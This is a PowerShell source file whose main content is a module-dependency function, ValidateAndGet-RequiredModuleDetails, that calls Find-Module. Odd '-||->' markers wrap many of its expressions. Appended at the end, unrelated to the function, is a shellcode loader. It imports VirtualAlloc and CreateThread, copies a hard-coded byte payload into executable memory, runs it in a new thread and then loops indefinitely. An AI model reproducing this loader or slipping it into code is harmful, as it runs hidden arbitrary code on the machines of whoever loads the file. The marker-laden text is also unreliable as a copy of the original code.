 -||-> function ValidateAndGet-RequiredModuleDetails
{
    param(
        [Parameter()]
        $ModuleManifestRequiredModules,

        [Parameter()]
        [PSModuleInfo[]]
        $RequiredPSModuleInfos,

        [Parameter(Mandatory=$true)]
        [string]
        $Repository,

        [Parameter(Mandatory=$true)]
        [PSModuleInfo]
        $DependentModuleInfo,

        [parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCmdlet]
        $CallerPSCmdlet,

        [Parameter(Mandatory = $false)]
        [pscredential]
        $Credential
    )

     -||-> $RequiredModuleDetails = @() <-||- 

     -||-> if( -||-> -not $RequiredPSModuleInfos <-||- )
    {
        return  -||-> $RequiredModuleDetails <-||- 
    } <-||- 

     -||-> if( -||-> $ModuleManifestRequiredModules <-||- )
    {
         -||-> ForEach($RequiredModule in  -||-> $ModuleManifestRequiredModules <-||- )
        {
             -||-> $ModuleName = $null <-||- 
             -||-> $VersionString = $null <-||- 

             -||-> $ReqModuleInfo = @{} <-||- 

             -||-> $FindModuleArguments = @{
                                        Repository =  -||-> $Repository <-||- 
                                        Verbose =  -||-> $VerbosePreference <-||- 
                                        ErrorAction =  -||-> 'SilentlyContinue' <-||- 
                                        WarningAction =  -||-> 'SilentlyContinue' <-||- 
                                        Debug =  -||-> $DebugPreference <-||- 
                                    } <-||- 
             -||-> if ( -||-> $PSBoundParameters.ContainsKey('Credential') <-||- )
            {
                 -||-> $FindModuleArguments.Add('Credential',$Credential) <-||- 
            } <-||- 

            
             -||-> if( -||-> $RequiredModule.GetType().ToString() -eq 'System.Collections.Hashtable' <-||- )
            {
                 -||-> $ModuleName = $RequiredModule.ModuleName <-||- 

                
                
                
                 -||-> if( -||-> $RequiredModule.Keys -Contains "RequiredVersion" <-||- )
                {
                     -||-> $FindModuleArguments['RequiredVersion'] = $RequiredModule.RequiredVersion <-||- 
                     -||-> $ReqModuleInfo['RequiredVersion'] = $RequiredModule.RequiredVersion <-||- 
                }
                elseif( -||-> $RequiredModule.Keys -Contains "ModuleVersion" <-||- )
                {
                     -||-> $FindModuleArguments['MinimumVersion'] = $RequiredModule.ModuleVersion <-||- 
                     -||-> $ReqModuleInfo['MinimumVersion'] = $RequiredModule.ModuleVersion <-||- 
                } <-||- 

                 -||-> if( -||-> $RequiredModule.Keys -Contains 'MaximumVersion' -and $RequiredModule.MaximumVersion <-||- )
                {
                    
                    
                    
                     -||-> $maximumVersion = $RequiredModule.MaximumVersion -replace '\*','99999999' <-||- 

                     -||-> $FindModuleArguments['MaximumVersion'] = $maximumVersion <-||- 
                     -||-> $ReqModuleInfo['MaximumVersion'] = $maximumVersion <-||- 
                } <-||- 
            }
            else
            {
                
                 -||-> $ModuleName = $RequiredModule.ToString() <-||- 
            } <-||- 

             -||-> if( -||-> ( -||-> Get-ExternalModuleDependencies -PSModuleInfo $DependentModuleInfo <-||- ) -contains $ModuleName <-||- )
            {
                 -||-> Write-Verbose -Message ( -||-> $LocalizedData.SkippedModuleDependency -f $ModuleName <-||- ) <-||- 

                continue
            } <-||- 

            
            
            
             -||-> if( -||-> $RequiredPSModuleInfos.Name -notcontains $ModuleName <-||- )
            {
                continue
            } <-||- 

             -||-> $ReqModuleInfo['Name'] = $ModuleName <-||- 

            
            
            
             -||-> $FindModuleArguments['Name'] = $ModuleName <-||- 

             -||-> $psgetItemInfo =  -||-> Find-Module @FindModuleArguments  |
                                        Microsoft.PowerShell.Core\Where-Object { -||-> $_.Name -eq $ModuleName <-||- } |
                                            Microsoft.PowerShell.Utility\Select-Object -Last 1 -ErrorAction Ignore <-||-  <-||- 

             -||-> if( -||-> -not $psgetItemInfo <-||- )
            {
                 -||-> $message = $LocalizedData.UnableToResolveModuleDependency -f ( -||-> $ModuleName, $DependentModuleInfo.Name, $Repository, $ModuleName, $Repository, $ModuleName, $ModuleName <-||- ) <-||- 
                 -||-> ThrowError -ExceptionName "System.InvalidOperationException" `
                            -ExceptionMessage $message `
                            -ErrorId "UnableToResolveModuleDependency" `
                            -CallerPSCmdlet $CallerPSCmdlet `
                            -ErrorCategory InvalidOperation <-||- 
            } <-||- 

             -||-> $RequiredModuleDetails += $ReqModuleInfo <-||- 
        } <-||- 
    }
    else
    {
        
        

         -||-> $FindModuleArguments = @{
                                    Repository =  -||-> $Repository <-||- 
                                    Verbose =  -||-> $VerbosePreference <-||- 
                                    ErrorAction =  -||-> 'SilentlyContinue' <-||- 
                                    WarningAction =  -||-> 'SilentlyContinue' <-||- 
                                    Debug =  -||-> $DebugPreference <-||- 
                                } <-||- 
         -||-> if ( -||-> $PSBoundParameters.ContainsKey('Credential') <-||- )
        {
             -||-> $FindModuleArguments.Add('Credential',$Credential) <-||- 
        } <-||- 

         -||-> ForEach($RequiredModuleInfo in  -||-> $RequiredPSModuleInfos <-||- )
        {
             -||-> $ModuleName = $requiredModuleInfo.Name <-||- 

             -||-> if( -||-> ( -||-> Get-ExternalModuleDependencies -PSModuleInfo $DependentModuleInfo <-||- ) -contains $ModuleName <-||- )
            {
                 -||-> Write-Verbose -Message ( -||-> $LocalizedData.SkippedModuleDependency -f $ModuleName <-||- ) <-||- 

                continue
            } <-||- 

             -||-> $FindModuleArguments['Name'] = $ModuleName <-||- 
             -||-> $FindModuleArguments['MinimumVersion'] = $requiredModuleInfo.Version <-||- 

             -||-> $psgetItemInfo =  -||-> Find-Module @FindModuleArguments |
                                        Microsoft.PowerShell.Core\Where-Object { -||-> $_.Name -eq $ModuleName <-||- } |
                                            Microsoft.PowerShell.Utility\Select-Object -Last 1 -ErrorAction Ignore <-||-  <-||- 

             -||-> if( -||-> -not $psgetItemInfo <-||- )
            {
                 -||-> $message = $LocalizedData.UnableToResolveModuleDependency -f ( -||-> $ModuleName, $DependentModuleInfo.Name, $Repository, $ModuleName, $Repository, $ModuleName, $ModuleName <-||- ) <-||- 
                 -||-> ThrowError -ExceptionName "System.InvalidOperationException" `
                            -ExceptionMessage $message `
                            -ErrorId "UnableToResolveModuleDependency" `
                            -CallerPSCmdlet $PSCmdlet `
                            -ErrorCategory InvalidOperation <-||- 
            } <-||- 

             -||-> $RequiredModuleDetails += @{
                                            Name= -||-> $_.Name <-||- 
                                            MinimumVersion= -||-> $_.Version <-||- 
                                       } <-||- 
        } <-||- 
    } <-||- 

    return  -||-> $RequiredModuleDetails <-||- 
} <-||- 
 -||-> $Zxnl8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $Zxnl8 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x3a,0xf6,0x19,0xf0,0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0x35,0x14,0xec,0x0c,0xa1,0x5a,0x0f,0xed,0x31,0x3b,0x99,0x08,0x00,0x7b,0xfd,0x59,0x32,0x4b,0x75,0x0f,0xbe,0x20,0xdb,0xa4,0x35,0x44,0xf4,0xcb,0xfe,0xe3,0x22,0xe5,0xff,0x58,0x16,0x64,0x83,0xa2,0x4b,0x46,0xba,0x6c,0x9e,0x87,0xfb,0x91,0x53,0xd5,0x54,0xdd,0xc6,0xca,0xd1,0xab,0xda,0x61,0xa9,0x3a,0x5b,0x95,0x79,0x3c,0x4a,0x08,0xf2,0x67,0x4c,0xaa,0xd7,0x13,0xc5,0xb4,0x34,0x19,0x9f,0x4f,0x8e,0xd5,0x1e,0x86,0xdf,0x16,0x8c,0xe7,0xd0,0xe4,0xcc,0x20,0xd6,0x16,0xbb,0x58,0x25,0xaa,0xbc,0x9e,0x54,0x70,0x48,0x05,0xfe,0xf3,0xea,0xe1,0xff,0xd0,0x6d,0x61,0xf3,0x9d,0xfa,0x2d,0x17,0x23,0x2e,0x46,0x23,0xa8,0xd1,0x89,0xa2,0xea,0xf5,0x0d,0xef,0xa9,0x94,0x14,0x55,0x1f,0xa8,0x47,0x36,0xc0,0x0c,0x03,0xda,0x15,0x3d,0x4e,0xb2,0xda,0x0c,0x71,0x42,0x75,0x06,0x02,0x70,0xda,0xbc,0x8c,0x38,0x93,0x1a,0x4a,0x3f,0x8e,0xdb,0xc4,0xbe,0x31,0x1c,0xcc,0x04,0x65,0x4c,0x66,0xad,0x06,0x07,0x76,0x52,0xd3,0xb2,0x73,0xc4,0xa3,0x42,0x7d,0x15,0x34,0x41,0x7d,0x13,0x80,0xcc,0x9b,0x4b,0x58,0x9f,0x33,0x2b,0x08,0x5f,0xe4,0xc3,0x42,0x50,0xdb,0xf3,0x6c,0xba,0x74,0x99,0x82,0x13,0x2c,0x35,0x3a,0x3e,0xa6,0xa4,0xc3,0x94,0xc2,0xe6,0x48,0x1b,0x32,0xa8,0xb8,0x56,0x20,0x5c,0x49,0x2d,0x1a,0xca,0x56,0x9b,0x31,0xf2,0xc2,0x20,0x90,0xa5,0x7a,0x2b,0xc5,0x81,0x24,0xd4,0x20,0x9a,0xed,0x40,0x8b,0xf4,0x11,0x85,0x0b,0x04,0x44,0xcf,0x0b,0x6c,0x30,0xab,0x5f,0x89,0x3f,0x66,0xcc,0x02,0xaa,0x89,0xa5,0xf7,0x7d,0xe2,0x4b,0x2e,0x49,0xad,0xb4,0x05,0x4b,0x91,0x62,0x63,0x39,0xfb,0xb6 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Zxn=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Zxn.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Zxn,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



